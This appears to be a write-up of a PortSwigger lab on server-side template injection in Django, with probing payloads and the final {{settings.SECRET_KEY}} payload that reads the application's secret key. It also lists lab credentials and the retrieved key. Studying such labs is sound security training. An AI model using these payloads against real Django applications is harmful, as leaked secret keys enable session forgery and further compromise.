# Server-Side Template Injection — Information Disclosure via User-Supplied Objects


> **PortSwigger Web Security Academy — Practitioner Lab**

> **Vulnerability:** Server-Side Template Injection (SSTI)

> **Template Engine:** Django Templates
> **Impact:** Information Disclosure



## Lab Objective



The application is vulnerable to **Server-Side Template Injection** because a user-supplied object is passed into a 
server-side template.



The goal is to exploit the SSTI vulnerability to retrieve the application's Django `SECRET_KEY`.



---



## Credentials



```text

Username: content-manager

Password: C0nt3ntM4n4g3r

```



---



## 1. Identify the Template Engine


First, test whether the input is being interpreted as a template.



I initially tried:



```django

{{7*7}}

```



The application returned:



```text

django.template.exceptions.TemplateSyntaxError:

Could not parse the remainder: '*7' from '7*7'

```



The error revealed:



```text

django/template/base.py

```



This indicates that the application is using **Django Templates**.




### Important



The failure of `{{7*7}}` does **not** mean SSTI is not present.



Django Template Language does not support arbitrary mathematical expressions in the same way as some other template 
engines.



---



## 2. Confirm Template Evaluation



I used a simple Django template expression:



```django

{{7}}

```



This helps confirm that the input is being evaluated by the template engine.



---



## 3. Explore the Template Context


I tested:



```django

{{request}}

```



and:



```django

{{request.user}}

```


The page was blank, so these objects were not useful in this particular template context.


I then tried the Django debug tag:



```django

{% debug %}

```



This produced a `UnicodeEncodeError`, which was another indication that the Django template syntax was being 
processed.



---



## 4. Think About Accessible Objects



The important clue in the lab description is:



> "an object is being passed into the template"



At this point, instead of trying random SSTI payloads, the useful approach is to think about **objects available to 
Django templates**.



A particularly interesting object is:



```text

settings

```



Django settings contain application configuration.



One sensitive setting is:



```text

SECRET_KEY

```



Django documents `SECRET_KEY` as a secret value that should not be disclosed.



---


## 5. Retrieve the Secret Key



The final payload was:



```django

{{settings.SECRET_KEY}}

```



The application returned:



```text

17icrmj2rp5yyh9k0auck702czplrkz

```





Submitting this value solved the lab.


---

#
 Exploitation Flow



```text

User-controlled input

        ↓

Django Template

        ↓

Template evaluation

        ↓


Accessible object
        ↓

settings
        ↓

SECRET_KEY

        ↓

Sensitive information disclosure

```



---



# Why This Worked



The vulnerability was not about executing operating-system commands.



Instead, the attacker could access an object exposed to the template and read a sensitive property from it:



```django

{{settings.SECRET_KEY}}


```



This makes the vulnerability an example of:



```text

SSTI → Object Access → Sensitive Data Disclosure

```



---



# Methodology / What to Remember



When encountering a similar SSTI lab:



1. **Identify the template engine.**

2. **Confirm that user input is evaluated.**

3. **Determine which objects are accessible from the template context.**

4. **Look for interesting properties or application configuration.**

5. **Target sensitive information before attempting RCE.**



The key mindset is:



> **Don't memorize the payload. Identify the template engine, understand its object access rules, then enumerate 
useful objects and properties.**

---


## Key Payload




```django

{{settings.SECRET_KEY}}


```

## Result


```text

17icrmj2rp5yyh9k0auck702czplrkz

```

## References

* [PortSwigger Web Security Academy — Server-side template injection](https://portswigger.net/web-security/server-side-template-injection?utm_source=chatgpt.com)

* [Django Documentation — SECRET_KEY](https://docs.djangoproject.com/en/5.2/ref/settings/?utm_source=chatgpt.com#secret-key)
